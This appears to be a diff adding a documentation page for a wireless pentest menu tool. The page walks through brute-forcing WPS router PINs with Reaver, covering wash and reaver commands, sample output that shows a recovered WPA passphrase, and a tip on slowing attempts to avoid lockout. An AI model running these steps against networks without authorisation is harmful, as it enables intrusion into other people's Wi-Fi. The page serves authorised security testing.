@@ -1,0 +1,75 @@
+---
+title: "WPS Attacks"
+description: "Brute-forcing WPS-enabled routers with Reaver."
+---
+
+WPS (Wi-Fi Protected Setup) is a network security standard that uses an 8-digit PIN to authenticate devices. Because the PIN verification is split into two independent 4-digit halves, an attacker only needs to brute-force at most 11,000 combinations — making WPS a practical attack surface on routers that haven't disabled it.
+
+<Warning>
+  Only perform WPS attacks against networks you own or have explicit written permission to test. Unauthorized access is illegal.
+</Warning>
+
+## Perform WPS Attack (option 10)
+
+<Steps>
+  <Step title="Identify a WPS-enabled target">
+    Run a network scan first (option 3) and look for networks with `WPS` in their flags. You can also use `wash` to scan specifically for WPS-enabled APs:
+
+    ```bash
+    wash -i wlan0mon
+    ```
+
+    Note the target's BSSID (e.g., `AA:BB:CC:DD:EE:FF`).
+  </Step>
+
+  <Step title="Start monitor mode">
+    If not already in monitor mode, use option 1 first. The monitor interface is typically `wlan0mon`.
+  </Step>
+
+  <Step title="Select option 10 from the menu">
+    ```
+    Enter your choice: 10
+    Enter the interface: wlan0mon
+    Enter the BSSID: AA:BB:CC:DD:EE:FF
+    ```
+
+    The underlying command executed:
+
+    ```bash
+    reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
+    ```
+
+    The `-vv` flag enables verbose output so you can see each PIN attempt in real time.
+  </Step>
+
+  <Step title="Wait for the result">
+    Reaver will iterate through WPS PIN combinations. A successful result looks like:
+
+    ```text
+    [+] WPS PIN: '12345670'
+    [+] WPA PSK: 'MySecretPassword'
+    [+] AP SSID: 'HomeNetwork'
+    ```
+
+    The attack can take anywhere from a few minutes to several hours depending on the router's response time and whether it has rate limiting.
+  </Step>
+</Steps>
+
+## What to expect during the attack
+
+| Output | Meaning |
+|--------|---------|
+| `[+] Trying pin 12345670` | Reaver is testing a PIN combination |
+| `[!] WARNING: Failed to associate` | Reaver couldn't connect — try moving closer or restarting monitor mode |
+| `[!] WPS transaction failed` | The router rejected the attempt — may be locked out |
+| `[+] WPS PIN: '...'` | Attack succeeded |
+
+## WPS lockout
+
+<Note>
+  Many modern routers lock WPS after 3–10 failed attempts, sometimes for 30–60 minutes. If you see repeated `WPS transaction failed` messages, the router may be locked. Wait and retry, or check whether the router has a lockout reset mechanism.
+</Note>
+
+<Tip>
+  To add a delay between attempts and reduce the chance of triggering lockout, run Reaver manually from the terminal with the `-d` flag: `reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 5`. The script itself runs Reaver with only `-vv` and does not expose additional flags.
+</Tip>
